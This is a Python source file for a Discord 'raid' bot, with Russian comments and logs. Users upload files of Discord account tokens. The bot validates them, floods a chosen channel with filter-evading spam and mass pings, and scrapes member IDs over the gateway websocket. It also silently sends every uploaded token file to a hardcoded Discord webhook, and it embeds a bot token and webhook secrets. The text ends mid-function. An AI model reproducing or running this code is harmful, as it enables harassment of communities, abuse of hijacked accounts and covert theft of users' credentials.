# -*- coding: utf-8 -*-
import asyncio
import random
import tls_client
import string
import uuid
import aiohttp
from aiolimiter import AsyncLimiter
from datetime import datetime
import json
import disnake
import secrets
import delorean
from disnake.ext import tasks, commands as disnake_commands
from rich.console import Console
from rich.theme import Theme
from rich.table import Table
from rich.box import SIMPLE
import os
from concurrent.futures import ThreadPoolExecutor
import logging
import threading
from deep_translator import GoogleTranslator
import brotli
import requests
import websocket
from websocket import create_connection, WebSocketException
import re
import pyfiglet
import time
import base64
from typing import List, Dict, Optional
import urllib.parse
from zoneinfo import ZoneInfo as timezone

theme = Theme({
    "success": "bold green",
    "error": "bold red",
    "info": "cyan",
    "warning": "yellow",
    "action": "bold magenta"
})
console = Console(theme=theme)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s:%(levelname)s:%(name)s: %(message)s'
)
logger = logging.getLogger(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1374594431415615538/P4CyWABW4PvU_qnnBiW00dL8gpgbStnRXzRJbfwir25nLZXgRulsbF7o78uh9_rdmCZR"  
WEBHOOK_URL_2 = "https://discord.com/api/webhooks/1374805953031180359/NJpr80xR9qEj8hMSfS8hWO6nRIv6M51uBJlFH9mDlnZZ2rP9pD27twQgc5puCeTcX0ix"
PROTECTED_GUILD_ID = "1367405201933467739"
excluded_server_ids = {1367405201933467739}
DISCORD_TOKEN_PATTERN = re.compile(r'^[A-Za-z0-9+/=_-]+\.[A-Za-z0-9+/=_-]+\.[A-Za-z0-9+/=_-]+$')
BOT_TOKEN = "MTM1MzgwMzA5NTc2MjUzNDQwMA.G2_mBO.CeBUTDYwp6gRqXIJLyx3hLFcybYUxNMaFpG1mo"  

error_counts = {}
active_raids = {}
limiter_check = AsyncLimiter(30, 1)  
limiter_spam = AsyncLimiter(30, 1)   
limiter = AsyncLimiter(30, 1)
limiter_webhook_file = AsyncLimiter(5, 1)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
]

intents = disnake.Intents.default()
intents.message_content = True
intents.messages = True
intents.presences = True
intents.guilds = True
intents.members = True
intents.guild_messages = True
intents.integrations = True
intents.voice_states = True
bot = disnake_commands.Bot(command_prefix="?", intents=intents, test_guilds=None)

def send_to_webhook(message):
    payload = {"content": message, "username": "Bot Logger"}
    
    try:
        resp = requests.post(WEBHOOK_URL, json=payload)
        if resp.status_code == 204:
            console.print(f"[info]ℹ Лог отправлен в вебхук 1: {message[:50]}...[/]")
        else:
            console.print(f"[error]❌ Ошибка при отправке лога в вебхук 1: HTTP {resp.status_code}[/]")
    except Exception as e:
        if "401 Unauthorized" in str(e):
            return  
        console.print(f"[error]❌ Ошибка при отправке лога в вебхук 1: {e}[/]")

def log_error(token, error_type="generic"):
    token_short = token[:6] + "..."
    if token_short not in error_counts:
        error_counts[token_short] = {}
    error_counts[token_short][error_type] = error_counts[token_short].get(error_type, 0) + 1
    count = error_counts[token_short][error_type]
    if count % 100 == 0:
        send_to_webhook(f"[Ошибка] Токен {token_short} достиг {count} ошибок типа '{error_type}'")
        console.print(f"[error]❌ Токен {token_short} достиг {count} ошибок типа '{error_type}'[/]")

async def send_file_to_webhook(message, file_path):
    payload = {"content": message, "username": "Bot Logger"}
    
    try:
        async with aiohttp.ClientSession() as session:
            async with limiter_webhook_file:
                with open(file_path, 'rb') as f:
                    form = aiohttp.FormData()
                    form.add_field('payload_json', json.dumps(payload))
                    form.add_field('file', f, filename=os.path.basename(file_path), content_type='text/plain')
                    async with session.post(WEBHOOK_URL_2, data=form) as resp:
                        if resp.status == 204:
                            console.print(f"[success]✅ Файл и лог отправлены в вебхук 2: {message[:50]}...[/]")
                        else:
                            console.print(f"[error]❌ Ошибка при отправке файла в вебхук 2: HTTP {resp.status}[/]")
    except Exception as e:
        if "401 Unauthorized" in str(e):
            return  
        console.print(f"[error]❌ Ошибка при отправке файла в вебхук 2: {e}[/]")
        
async def save_tokens_file(tokens_file, author_name):
    possible_dirs = [
        "tokens",
        os.path.join(os.path.dirname(os.path.abspath(__file__)), "tokens"),
        os.path.join(os.getcwd(), "tokens"),
        os.path.join(os.path.expanduser("~"), "tokens"),
        "temp_tokens"
    ]
    
    file_content = await tokens_file.read()
    unique_filename = f"tokens_{uuid.uuid4().hex}.txt"
    saved = False
    file_path = None
    
    for tokens_dir in possible_dirs:
        try:
            os.makedirs(tokens_dir, exist_ok=True)
            file_path = os.path.join(tokens_dir, unique_filename)
            with open(file_path, "wb") as f:
                f.write(file_content)
            await send_file_to_webhook(
                f'[Инфо] Файл {tokens_file.filename} сохранён как {unique_filename} пользователем {author_name}',
                file_path
            )
            console.print(f"[success]✅ Файл {tokens_file.filename} сохранён как {unique_filename} в {tokens_dir}[/]")
            saved = True
            break
        except PermissionError:
            console.print(f"[warning]⚠️ Не удалось создать директорию {tokens_dir} из-за отсутствия прав[/]")
            continue
        except Exception as e:
            console.print(f"[error]❌ Ошибка при сохранении в {tokens_dir}: {str(e)}[/]")
            continue
    
    if not saved:
        console.print(f"[warning]⚠️ Не удалось сохранить файл на диск, файл будет обработан из памяти[/]")
        send_to_webhook(
            f'[Предупреждение] Не удалось сохранить файл {tokens_file.filename} на диск, обработка из памяти'
        )
    
    return file_content

def create_directory(server_id):
    directory = f"scrapes/{server_id}"
    os.makedirs(directory, exist_ok=True)
    if not os.path.isfile(f"{directory}/users.txt"):
        with open(f"{directory}/users.txt", "w") as file:
            file.write("")
    return directory

def read_users(directory):
    if not os.path.isfile(f"{directory}/users.txt"):
        open(f"{directory}/users.txt", "w").close()
    with open(f"{directory}/users.txt", "r") as file:
        return file.read().splitlines()

def save_users(user_ids, directory):
    existing_users = set(read_users(directory))
    with open(f"{directory}/users.txt", "a") as file:
        for user_id in user_ids:
            if user_id not in existing_users:
                file.write(f"{user_id}\n")

def generate_random_symbols(length=5):
    all_chars = string.ascii_letters + string.digits
    left_symbols = ''.join(random.choices(all_chars, k=length))
    right_symbols = ''.join(random.choices(all_chars, k=length))
    while left_symbols == right_symbols:
        right_symbols = ''.join(random.choices(all_chars, k=length))
    return left_symbols, right_symbols

def generate_random_emoji(length=3):
    emojis = ['😀', '😃', '😄', '😁', '😆', '😅', '😂', '🤣', '😊', '😇']
    return ''.join(random.choices(emojis, k=length))
async def request(
    method: str,
    url: str,
    payload: dict = None,
    headers: dict = None,
    timeout: float = 10,
    retries: int = 6
):
    headers = headers or {'Authorization': f'Bot {BOT_TOKEN}', 'Content-Type': 'application/json'}
    for attempt in range(retries):
        try:
            async with aiohttp.ClientSession() as session:
                async with limiter_check if method == "GET" else limiter_spam:
                    kwargs = {'headers': headers, 'timeout': aiohttp.ClientTimeout(total=timeout)}
                    if payload:
                        kwargs['json'] = payload
                    method_func = getattr(session, method.lower())
                    async with method_func(url, **kwargs) as resp:
                        console.print(f"[info]🔍 HTTP Status: {resp.status} для {url}[/]")
                        if resp.status == 429:
                            retry_after = float(resp.headers.get('X-RateLimit-Reset-After', 1))
                            console.print(f"[warning]⏳ Rate limit, ждем {retry_after:.2f} секунд...[/]")
                            await asyncio.sleep(retry_after + random.uniform(0.1, 0.5))
                            continue
                        if resp.status == 403:
                            console.print(f"[error]❌ Ошибка 403: Недостаточно прав для {url}[/]")
                            return None
                        if resp.status == 404:
                            console.print(f"[warning]⚠️ Ошибка 404: Неверный URL {url}, пропускаем[/]")
                            return None
                        if resp.status >= 200 and resp.status < 300:
                            console.print(f"[success]✅ Успешный запрос: {url}[/]")
                            if resp.content_type == 'application/json':
                                return await resp.json()
                            return resp
                        console.print(f"[error]❌ Ошибка: HTTP {resp.status} для {url}[/]")
                        return None
        except Exception as e:
            console.print(f"[error]❌ Ошибка: {e} для {url}[/]")
            await asyncio.sleep(2 ** attempt + random.uniform(0.1, 0.5))
    console.print(f"[error]❌ Не удалось выполнить запрос после {retries} попыток для {url}[/]")
    return None

async def send_requests(urls: list, method: str, payload: dict = None, headers: dict = None):
    if not urls:
        return []
    headers = headers or {'Authorization': f'Bot {BOT_TOKEN}', 'Content-Type': 'application/json'}
    random.shuffle(urls)
    async with aiohttp.ClientSession() as session:
        tasks = []
        for url in urls:
            tasks.append(asyncio.create_task(
                request(method, url, payload, headers=headers)
            ))
        await asyncio.sleep(random.uniform(0.003, 0.015))
        return await asyncio.gather(*tasks, return_exceptions=True)
    
async def validate_tokens(tokens, batch_size=50, max_concurrent=50):
    valid_tokens = []
    seen_tokens = set()
    semaphore = asyncio.Semaphore(max_concurrent)
    
    async def check_token(session, token):
        async with semaphore:
            if token in seen_tokens:
                console.print(f"[info]ℹ Дубликат токена: {token[:6]}... Пропускаю[/]")
                return None
            seen_tokens.add(token)
            headers = {'Authorization': token, 'User-Agent': random.choice(USER_AGENTS)}
            try:
                async with session.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=5) as resp:
                    if resp.status == 200:
                        console.print(f"[success]✅ Токен {token[:6]}... валиден[/]")
                        return token
                    else:
                        log_error(token, "validation")
                        console.print(f"[error]❌ Токен {token[:6]}... невалиден (HTTP {resp.status})[/]")
                        return None
            except Exception as e:
                log_error(token, f"validation: {str(e)}")
                console.print(f"[error]❌ Ошибка проверки токена {token[:6]}...: {str(e)}[/]")
                return None

    async with aiohttp.ClientSession() as session:
        for i in range(0, len(tokens), batch_size):
            batch = tokens[i:i + batch_size]
            tasks = [check_token(session, token) for token in batch]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            valid_tokens.extend([r for r in results if r is not None])
            await asyncio.sleep(0.1)  

    return valid_tokens
class Utils:
    @staticmethod
    def rangeCorrector(ranges):
        if [0, 99] not in ranges:
            ranges.insert(0, [0, 99])
        return ranges

    @staticmethod
    def getRanges(index, multiplier, memberCount):
        initialNum = int(index * multiplier)
        rangesList = [[initialNum, initialNum + 99]]
        if memberCount > initialNum + 99:
            rangesList.append([initialNum + 100, initialNum + 199])
        return Utils.rangeCorrector(rangesList)

    @staticmethod
    def parseGuildMemberListUpdate(response):
        memberdata = {
            "online_count": response["d"]["online_count"],
            "member_count": response["d"]["member_count"],
            "id": response["d"]["id"],
            "guild_id": response["d"]["guild_id"],
            "hoisted_roles": response["d"]["groups"],
            "types": [],
            "locations": [],
            "updates": []
        }
        for chunk in response['d']['ops']:
            memberdata['types'].append(chunk['op'])
            if chunk['op'] in ('SYNC', 'INVALIDATE'):
                memberdata['locations'].append(chunk['range'])
                if chunk['op'] == 'SYNC':
                    memberdata['updates'].append(chunk.get('items', []))
                else:
                    memberdata['updates'].append([])
            elif chunk['op'] in ('INSERT', 'UPDATE', 'DELETE'):
                memberdata['locations'].append(chunk.get('index', 0))
                if chunk['op'] == 'DELETE':
                    memberdata['updates'].append([])
                else:
                    memberdata['updates'].append(chunk.get('item', {}))
        return memberdata

async def check_protected_guild(inter: disnake.ApplicationCommandInteraction):
    if str(inter.guild_id) == PROTECTED_GUILD_ID:
        await inter.response.send_message("Сервер защищён", ephemeral=True)
        send_to_webhook(f'[Попытка] {inter.author} пытался использовать команду на защищённом сервере')
        console.print(f"[error]❌ {inter.author} пытался использовать команду на защищённом сервере[/]")
        return True
    return False

class StopRaidButton(disnake.ui.View):
    def __init__(self, raid_manager, channel_id):
        super().__init__(timeout=None)
        self.raid_manager = raid_manager
        self.channel_id = channel_id

    @disnake.ui.button(label="Остановить рейд", style=disnake.ButtonStyle.red)
    async def stop_raid(self, button: disnake.ui.Button, interaction: disnake.MessageInteraction):
        if self.raid_manager.is_running:
            self.raid_manager.is_running = False
            await interaction.response.send_message("Успешно остановлен", ephemeral=True)
            console.print(f"[success]✅ Рейд остановлен пользователем {interaction.author}[/]")
            send_to_webhook(f"[Успех] Рейд остановлен пользователем {interaction.author}")
            if self.channel_id in active_raids:
                del active_raids[self.channel_id]
        else:
            await interaction.response.send_message("Рейд уже завершён", ephemeral=True)

@bot.slash_command(name="raid", description="Запускает быстрый бесконечный спам в канал")
async def raid(
    inter: disnake.ApplicationCommandInteraction,
    server_id: str = disnake_commands.Param(description="ID сервера"),
    channel_id: str = disnake_commands.Param(description="ID канала"),
    message_text: str = disnake_commands.Param(description="Текст сообщения для спама"),
    num_pings: int = disnake_commands.Param(description="Количество пингов в сообщении (0-20)", ge=0, le=20, default=0),
    include_symbols: bool = disnake_commands.Param(default=False, description="Добавить случайные символы?"),
    include_emojis: bool = disnake_commands.Param(default=False, description="Добавить эмодзи?"),
    use_translation: bool = disnake_commands.Param(default=False, description="Переводить сообщения?"),
    disable_pings: bool = disnake_commands.Param(default=False, description="Отключить пинги (только текст)?"),
    tokens_file: disnake.Attachment = disnake_commands.Param(description="Текстовый файл с токенами (.txt)")
):
    if await check_protected_guild(inter):
        return

    if channel_id in active_raids:
        await inter.response.send_message("Ошибка: Спам уже идёт в этом канале!", ephemeral=True)
        console.print(f"[error]❌ {inter.author} попытался запустить рейд в канал {channel_id}, где уже идёт спам[/]")
        send_to_webhook(f'[Ошибка] {inter.author} попытался запустить рейд в канал {channel_id}, где уже идёт спам')
        return

    console.print(f"[info]ℹ Пользователь {inter.author} вызвал /raid с параметрами: server_id={server_id}, channel_id={channel_id}[/]")
    send_to_webhook(f'[Команда] Пользователь {inter.author} вызвал /raid с параметрами: server_id={server_id}, channel_id={channel_id}')
    await inter.response.defer(ephemeral=True)

    if not tokens_file.filename.endswith(".txt"):
        await inter.edit_original_response(content="Ошибка: нужен .txt файл")
        console.print(f"[error]❌ Неверный формат файла: нужен .txt[/]")
        send_to_webhook(f'[Ошибка] Неверный формат файла от {inter.author}: нужен .txt')
        return

    file_content = await save_tokens_file(tokens_file, inter.author.name)
    tokens = file_content.decode('utf-8').splitlines()
    tokens = [token.strip() for token in tokens if token.strip()]
    
    if await check_token_count(tokens, inter, inter.author):
        return

    await inter.edit_original_response(content="Проверяю токены...")
    valid_tokens = await validate_tokens(tokens)

    if not valid_tokens:
        await inter.edit_original_response(content="Ошибка: нет валидных токенов")
        console.print(f"[error]❌ Нет валидных токенов в файле {tokens_file.filename} от {inter.author}[/]")
        send_to_webhook(f'[Ошибка] Нет валидных токенов в файле {tokens_file.filename} от {inter.author}')
        return

    directory = create_directory(server_id)
    user_ids = read_users(directory)
    supported_languages = ['en', 'ru', 'es', 'fr', 'de', 'it', 'pl', 'zh-CN', 'ja', 'ko']

    raid_manager = RaidManager(
        user_ids=user_ids,
        message_text=message_text,
        tokens=valid_tokens,
        channel_id=channel_id,
        num_pings=num_pings,
        include_symbols=include_symbols,
        include_emojis=include_emojis,
        supported_languages=supported_languages,
        use_translation=use_translation,
        disable_pings=disable_pings,
        inter=inter
    )

    active_raids[channel_id] = raid_manager
    view = StopRaidButton(raid_manager, channel_id)
    await inter.edit_original_response(content="Рейд начат! Нажмите кнопку, чтобы остановить.", view=view)
    try:
        success, errors = await raid_manager.run()
    except Exception as e:
        console.print(f"[error]❌ Критическая ошибка в рейде: {str(e)}[/]")
        send_to_webhook(f"[Ошибка] Критическая ошибка в рейде от {inter.author}: {str(e)}")
        await inter.edit_original_response(content=f"Критическая ошибка в рейде: {str(e)}", view=None)
    finally:
        if channel_id in active_raids:
            del active_raids[channel_id]
        await inter.edit_original_response(view=None)

class RaidManager:
    def __init__(self, user_ids, message_text, tokens, channel_id, num_pings, include_symbols, include_emojis, supported_languages, use_translation, disable_pings, inter):
        self.user_ids = user_ids if isinstance(user_ids, list) else list(user_ids)
        self.message_text = message_text
        self.tokens = tokens
        self.active_tokens = tokens.copy()
        self.channel_id = channel_id
        self.num_pings = num_pings
        self.include_symbols = include_symbols
        self.include_emojis = include_emojis
        self.supported_languages = supported_languages
        self.use_translation = use_translation
        self.disable_pings = disable_pings
        self.inter = inter
        self.success_count = 0
        self.error_count = 0
        self.is_running = True
        self.start_time = time.time()
        self.limiter = AsyncLimiter(30, 1)
        self.lock = threading.Lock()

    async def update_status(self):
        while self.is_running:
            with self.lock:
                elapsed = time.time() - self.start_time
                message = (
                    f"Рейд в процессе... ({elapsed:.1f} сек)\n"
                    f"✅ Успешных сообщений: {self.success_count}\n"
                    f"❌ Ошибок: {self.error_count}\n"
                    f"📊 Активных токенов: {len(self.active_tokens)}/{len(self.tokens)}"
                )
            try:
                await self.inter.edit_original_response(content=message)
            except Exception as e:
                console.print(f"[error]❌ Ошибка обновления статуса: {str(e)}[/]")
            await asyncio.sleep(2)

    async def check_channel_access(self, session, token):
        url = f"https://discord.com/api/v9/channels/{self.channel_id}"
        headers = {'Authorization': token, 'User-Agent': random.choice(USER_AGENTS)}
        try:
            async with session.get(url, headers=headers, timeout=2) as response:
                if response.status == 200:
                    data = await response.json()
                    if 'id' in data:
                        console.print(f"[success]✅ Канал {self.channel_id} доступен для токена {token[:6]}...[/]")
                        return True
                if response.status in [401, 403]:
                    console.print(f"[error]❌ Токен {token[:6]}... невалиден или без прав (статус {response.status})[/]")
                    send_to_webhook(f"[Ошибка] Токен {token[:6]}... невалиден или без прав (статус {response.status})")
                    return False
                console.print(f"[error]❌ Канал {self.channel_id} недоступен для токена {token[:6]}... (статус {response.status})[/]")
                send_to_webhook(f"[Ошибка] Канал {self.channel_id} недоступен для токена {token[:6]}... (статус {response.status})")
                return False
        except Exception as e:
            console.print(f"[error]❌ Ошибка проверки доступа для токена {token[:6]}...: {str(e)}[/]")
            send_to_webhook(f"[Ошибка] Ошибка проверки доступа для токена {token[:6]}...: {str(e)}")
            return False

    async def send_message_with_validation(self, session, token, full_message):
        try:
            if not await self.check_channel_access(session, token):
                console.print(f"[info]ℹ Токен {token[:6]}... исключён из-за отсутствия доступа или невалидности[/]")
                send_to_webhook(f"[Инфо] Токен {token[:6]}... исключён из-за отсутствия доступа или невалидности")
                return False

            url = f"https://discord.com/api/v9/channels/{self.channel_id}/messages"
            headers = {
                'Authorization': token,
                'Content-Type': 'application/json',
                'User-Agent': random.choice(USER_AGENTS)
            }
            payload = {'content': full_message}
            async with self.limiter:
                response = await request("POST", url, payload, headers)
                if response and isinstance(response, dict) and 'id' in response:
                    with self.lock:
                        self.success_count += 1
                    console.print(f"[success]✅ Сообщение отправлено токеном {token[:6]}... в канал {self.channel_id}[/]")
                    return True
                else:
                    with self.lock:
                        self.error_count += 1
                    if response and isinstance(response, dict):
                        code = response.get('code')
                        if code in [401, 403]:
                            console.print(f"[error]❌ Токен {token[:6]}... невалиден или без прав (код {code})[/]")
                            send_to_webhook(f"[Ошибка] Токен {token[:6]}... невалиден или без прав (код {code})")
                            return False
                        elif code == 404:
                            console.print(f"[error]❌ Канал {self.channel_id} не найден для токена {token[:6]}...[/]")
                            send_to_webhook(f"[Ошибка] Канал {self.channel_id} не найден для токена {token[:6]}...")
                            return False
                        elif code == 429:
                            console.print(f"[warning]⚠️ Токен {token[:6]}... получил ограничение по скорости (код 429)[/]")
                            send_to_webhook(f"[Предупреждение] Токен {token[:6]}... получил ограничение по скорости (код 429)")
                            return True 
                    console.print(f"[error]❌ Ошибка отправки сообщения токеном {token[:6]}...[/]")
                    return False
        except Exception as e:
            console.print(f"[error]❌ Ошибка при отправке сообщения токеном {token[:6]}...: {str(e)}[/]")
            send_to_webhook(f"[Ошибка] Ошибка при отправке сообщения токеном {token[:6]}...: {str(e)}")
            with self.lock:
                self.error_count += 1
            return False

    async def raid_users(self):
        async with aiohttp.ClientSession() as session:
            valid_tokens = []
            tasks = [self.check_channel_access(session, token) for token in self.active_tokens]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for token, result in zip(self.active_tokens.copy(), results):
                if result and not isinstance(result, Exception):
                    valid_tokens.append(token)
                else:
                    console.print(f"[info]ℹ Токен {token[:6]}... исключён из-за отсутствия доступа или невалидности[/]")
                    send_to_webhook(f"[Инфо] Токен {token[:6]}... исключён из-за отсутствия доступа или невалидности")

            with self.lock:
                self.active_tokens = valid_tokens

            if not self.active_tokens:
                self.is_running = False
                return

            while self.is_running and self.active_tokens:
                tasks = []
                tokens_to_remove = []
                for token in self.active_tokens[:]:
                    available_users = self.user_ids.copy()
                    if available_users and self.num_pings > 0 and not self.disable_pings:
                        to_ping = random.sample(available_users, min(self.num_pings, len(available_users)))
                        pings = " ".join([f"<@{user_id}>" for user_id in to_ping])
                    else:
                        pings = ""

                    if self.use_translation and "Windows PowerShell" not in self.message_text:
                        lang = random.choice(self.supported_languages)
                        translated_message = GoogleTranslator(source='auto', target=lang).translate(self.message_text)
                    else:
                        translated_message = self.message_text

                    full_message = f"{pings} {translated_message}".strip()
                    if self.include_symbols:
                        left_symbols, right_symbols = generate_random_symbols()
                        full_message = f"||{left_symbols}|| {full_message} ||{right_symbols}||"
                    if self.include_emojis:
                        emojis = generate_random_emoji()
                        full_message = f"{full_message} {emojis}"

                    result = await self.send_message_with_validation(session, token, full_message)
                    if result is False:  
                        tokens_to_remove.append(token)

                with self.lock:
                    for token in tokens_to_remove:
                        if token in self.active_tokens:
                            self.active_tokens.remove(token)
                            console.print(f"[info]ℹ Токен {token[:6]}... исключён из рейда[/]")
                            send_to_webhook(f"[Инфо] Токен {token[:6]}... исключён из рейда")

                if not self.active_tokens:
                    console.print(f"[warning]⚠️ Все токены исчерпаны, рейд останавливается[/]")
                    send_to_webhook(f"[Предупреждение] Все токены исчерпаны, рейд останавливается")
                    self.is_running = False
                    break

                await asyncio.sleep(0.003)

    async def run(self):
        try:
            console.print(f"[info]ℹ Запущен рейд пользователем {self.inter.author} в канал {self.channel_id}[/]")
            send_to_webhook(f"[Инфо] Запущен рейд пользователем {self.inter.author} в канал {self.channel_id}")
            status_task = asyncio.create_task(self.update_status())
            raid_task = asyncio.create_task(self.raid_users())
            await asyncio.gather(status_task, raid_task)
        except Exception as e:
            console.print(f"[error]❌ Ошибка в run: {str(e)}[/]")
            send_to_webhook(f"[Ошибка] Ошибка в run: {str(e)}")
        finally:
            self.is_running = False
            if not self.active_tokens:
                final_message = "Ошибка: у токенов нет доступа к каналу."
                console.print(f"[error]❌ Рейд не выполнен: у токенов нет доступа к каналу {self.channel_id}[/]")
                send_to_webhook(f"[Ошибка] Рейд не выполнен: у токенов нет доступа к каналу {self.channel_id}")
            else:
                final_message = (
                    f"Рейд завершён!\n"
                    f"✅ Успешных сообщений: {self.success_count}\n"
                    f"❌ Ошибок: {self.error_count}\n"
                    f"📊 Осталось активных токенов: {len(self.active_tokens)}"
                )
                console.print(f"[success]✅ Рейд завершён: {self.success_count} успехов, {self.error_count} ошибок[/]")
                send_to_webhook(f"[Успех] Рейд от {self.inter.author} завершён: {self.success_count} успехов, {self.error_count} ошибок")
            
            await self.inter.edit_original_response(content=final_message, view=None)
            return self.success_count, self.error_count

class DiscordSocket(websocket.WebSocketApp):
    def __init__(self, token, guild_id, channel_id):
        self.token = token
        self.guild_id = guild_id
        self.channel_id = channel_id
        self.has_channel_access = False
        self.socket_headers = {
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "Sec-WebSocket-Extensions": "permessage-deflate; client_max_window_bits",
            "User-Agent": random.choice(USER_AGENTS)
        }
        super().__init__("wss://gateway.discord.gg/?encoding=json&v=9",
                        header=self.socket_headers,
                        on_open=self.sock_open,
                        on_message=self.sock_message,
                        on_close=self.sock_close)
        self.endScraping = False
        self.guilds = {}
        self.members = {}
        self.ranges = [[0, 0]]
        self.lastRange = 0
        self.packets_recv = 0
        self.processed_users = set()
        self.save_lock = threading.Lock()
        self.thread_pool = ThreadPoolExecutor(max_workers=10)
        self.batch_size = 50
        self.user_batch = []

    async def check_channel_access(self):
        async with aiohttp.ClientSession() as session:
            url = f"https://discord.com/api/v9/channels/{self.channel_id}"
            headers = {'Authorization': self.token, 'User-Agent': random.choice(USER_AGENTS)}
            try:
                async with session.get(url, headers=headers) as response:
                    if response.status == 200:
                        data = await response.json()
                        if 'id' in data:
                            console.print(f"[success]✅ Канал {self.channel_id} доступен для токена {self.token[:6]}...[/]")
                            self.has_channel_access = True
                            return True
                    console.print(f"[error]❌ Канал {self.channel_id} недоступен для токена {self.token[:6]}...[/]")
                    send_to_webhook(f"[Ошибка] Канал {self.channel_id} недоступен для токена {self.token[:6]}...")
                    return False
            except Exception as e:
                console.print(f"[error]❌ Ошибка проверки доступа для токена {self.token[:6]}...: {str(e)}[/]")
                send_to_webhook(f"[Ошибка] Ошибка проверки доступа для токена {self.token[:6]}...: {str(e)}")
                return False

    def run(self):
        self.run_forever()
        return self.members

    def save_users_batch(self, users_batch):
        try:
            current_dir = create_directory(self.guild_id)
            save_users(users_batch, current_dir)
        except Exception as e:
            console.print(f"[error]❌ Ошибка при сохранении пакета пользователей: {str(e)}[/]")

    def add_user_to_batch(self, user_id):
        with self.save_lock:
            self.user_batch.append(user_id)
            if len(self.user_batch) >= self.batch_size:
                batch_to_save = self.user_batch.copy()
                self.user_batch.clear()
                self.thread_pool.submit(self.save_users_batch, batch_to_save)

    def scrapeUsers(self):
        if not self.endScraping:
            self.send(
                '{"op":14,"d":{"guild_id":"' +
                self.guild_id +
                '","typing":true,"activities":true,"threads":true,"channels":{"' +
                self.channel_id +
                '":' +
                json.dumps(self.ranges) +
                '}}}')
            time.sleep(0.00001)

    def sock_open(self, ws):
        asyncio.run(self.check_channel_access())
        if not self.has_channel_access:
            self.endScraping = True
            self.close()
            return
        self.send(
            '{"op":2,"d":{"token":"' +
            self.token +
            '","capabilities":125,"properties":{"os":"Windows","browser":"Chrome","device":"","system_locale":"en-US","browser_user_agent":"' + random.choice(USER_AGENTS) + '","browser_version":"91.0","os_version":"10","referrer":"","referring_domain":"","referrer_current":"","referring_domain_current":"","release_channel":"stable","client_build_number":103981,"client_event_source":null},"presence":{"status":"online","since":0,"activities":[],"afk":false},"compress":false,"client_state":{"guild_hashes":{},"highest_last_message_id":"0","read_state_version":0,"user_guild_settings_version":-1,"user_settings_version":-1}}}')

    def heartbeatThread(self, interval):
        try:
            while not self.endScraping:
                self.send('{"op":1,"d":' + str(self.packets_recv) + '}')
                time.sleep(interval)
        except Exception:
            return

    def sock_message(self, ws, message):
        try:
            decoded = json.loads(message)
            if decoded is None:
                return
            if decoded["op"] != 11:
                self.packets_recv += 1
            if decoded["op"] == 10:
                threading.Thread(
                    target=self.heartbeatThread,
                    args=(decoded["d"]["heartbeat_interval"] / 1000,),
                    daemon=True).start()
            if decoded["t"] == "READY":
                for guild in decoded["d"]["guilds"]:
                    self.guilds[guild["id"]] = {"member_count": guild["member_count"]}
            if decoded["t"] == "READY_SUPPLEMENTAL":
                self.ranges = Utils.getRanges(0, 100, self.guilds[self.guild_id]["member_count"])
                self.scrapeUsers()
            elif decoded["t"] == "GUILD_MEMBER_LIST_UPDATE":
                try:
                    parsed = Utils.parseGuildMemberListUpdate(decoded)
                    if parsed['guild_id'] == self.guild_id and ('SYNC' in parsed['types'] or 'UPDATE' in parsed['types']):
                        for elem, index in enumerate(parsed["types"]):
                            if index == "SYNC":
                                if len(parsed['updates'][elem]) == 0:
                                    self.endScraping = True
                                    if self.user_batch:
                                        self.thread_pool.submit(self.save_users_batch, self.user_batch.copy())
                                        self.user_batch.clear()
                                    break
                                for item in parsed["updates"][elem]:
                                    try:
                                        if "member" in item and "user" in item["member"]:
                                            mem = item["member"]
                                            if mem["user"].get("bot", False):
                                                continue
                                            try:
                                                user_id = mem["user"]["id"]
                                                if user_id in self.processed_users:
                                                    continue
                                                obj = {
                                                    "tag": mem["user"]["username"] + "#" + mem["user"]["discriminator"],
                                                    "id": user_id
                                                }
                                                self.members[user_id] = obj
                                                self.processed_users.add(user_id)
                                                self.add_user_to_batch(user_id)
                                            except KeyError:
                                                continue
                                    except Exception:
                                        continue
                            elif index == "UPDATE":
                                for item in parsed["updates"][elem]:
                                    try:
                                        if isinstance(item, dict) and "member" in item and "user" in item["member"]:
                                            mem = item["member"]
                                            if mem["user"].get("bot", False):
                                                continue
                                            try:
                                                user_id = mem["user"]["id"]
                                                if user_id in self.processed_users:
                                                    continue
                                                obj = {
                                                    "tag": mem["user"]["username"] + "#" + mem["user"]["discriminator"],
                                                    "id": user_id
                                                }
                                                self.members[user_id] = obj
                                                self.processed_users.add(user_id)
                                                self.add_user_to_batch(user_id)
                                            except KeyError:
                                                continue
                                    except Exception:
                                        continue
                            self.lastRange += 1
                            self.ranges = Utils.getRanges(self.lastRange, 100, self.guilds[self.guild_id]["member_count"])
                            self.scrapeUsers()
                except Exception:
                    pass
            if self.endScraping:
                self.close()
        except Exception:
            pass

    def sock_close(self, ws, close_code, close_msg):
        if self.user_batch:
            self.save_users_batch(self.user_batch.copy())
            self.user_batch.clear()
        self.thread_pool.shutdown(wait=False)
        console.print(f"[info]ℹ WebSocket закрыт для токена {self.token[:6]}...[/]")

async def check_token_count(tokens, inter, author):
    if len(tokens) > 500:
        await inter.edit_original_response(content="Ошибка: Слишком много токенов. Максимум 500 токенов.")
        console.print(f"[error]❌ Слишком много токенов ({len(tokens)}) от {author}[/]")
        send_to_webhook(f'[Ошибка] Слишком много токенов ({len(tokens)}) от {author}')
        return True
    return False

@bot.slash_command(name="scraper", description="Собирает пользователей с сервера")
async def scraper(
    inter: disnake.ApplicationCommandInteraction,
    server_id: str = disnake_commands.Param(description="ID сервера"),
    channel_id: str = disnake_commands.Param(description="ID канала"),
    tokens_file: disnake.Attachment = disnake_commands.Param(description="Текстовый файл с токенами (.txt)")
):
    if await check_protected_guild(inter):
        return

